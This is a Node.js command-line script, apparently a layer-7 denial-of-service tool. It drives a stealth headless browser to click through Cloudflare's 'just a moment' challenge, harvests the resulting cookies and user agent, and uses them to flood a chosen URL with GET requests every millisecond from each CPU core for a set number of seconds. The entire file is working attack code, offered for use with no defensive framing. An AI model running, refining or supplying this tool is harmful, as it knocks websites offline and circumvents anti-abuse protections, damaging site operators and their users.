const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const http2 = require('http2');
const os = require('os');
const args = process.argv.slice(2);

if (args.length < 2) {
  return console.log(`Browser
Usage: node Browser.js [url] [time]
start Browser`);
}

const target = args[0];
const time = parseInt(args[1], 10);

// Menambahkan plugin stealth
puppeteer.use(StealthPlugin());

async function visitPage(originalUrl) {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--start-maximized',
      '--disable-infobars',
      '--disable-web-security',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const page = await browser.newPage();
  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59';
  
  await page.setUserAgent(userAgent);
  await page.setViewport({ width: 1280, height: 800 });

  console.log(`[!] Navigating to URL: ${originalUrl}`);

  try {
    await page.goto(originalUrl, { waitUntil: 'networkidle2' });

    const isCFProtect = await page.evaluate(() => {
      const titleText = document.title.toLowerCase();
      return titleText.includes("just a moment");
    });

    if (isCFProtect) {
      console.log("[-] Detected CF Protection - Initiating bypass");
      const clickX = 219;
      const clickY = 279;

      const intervalId = setInterval(async () => {
        const stillProtected = await page.evaluate(() => {
          const titleText = document.title.toLowerCase();
          return titleText.includes("just a moment");
        });

        if (stillProtected) {
          await page.mouse.click(clickX, clickY);
        } else {
          console.log("[+] Cloudflare Successfully Bypassed");

          const cookies = await page.cookies();
          const cookieHeader = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

          console.log(`[+] Cookies: ${cookieHeader}`);
          console.log(`[+] User-Agent: ${userAgent}`);
          clearInterval(intervalId);
          console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
          flood(target, userAgent, cookieHeader, time);
        }
      }, 5000);
    } else {
      console.log("[+] No CF Protection detected - Proceeding normally");
      console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
      flood(target, userAgent, "", time);
    }

  } catch (error) {
    console.error('An error occurred:', error);
  }
}

async function flood(url, userAgent, cookieHeader, time) {
  const endTime = Date.now() + time * 1000;
  const cpuCount = os.cpus().length; // Number of CPU cores

  async function sendRequest() {
    try {
      const response = await axios.get(url, {
        headers: {
          "User-Agent": userAgent,
          "Cookie": cookieHeader
        }
      });
      //console.log(`Response Status Code: ${response.status}`);
    } catch (error) {
      //console.error(`Request failed with error: ${error.message}`);
    }
  }

  // Create a flood process for each CPU core
  for (let i = 0; i < cpuCount; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
        console.log(`[+] Flood completed for core ${i + 1}`);
      } else {
        sendRequest();
      }
    }, 1); // 1 ms interval per core
  }
  
  console.log(`[+] Flood started on ${cpuCount} cores for ${time} seconds`);
}



// Ganti dengan URL yang ingin Anda kunjungi
visitPage(target);
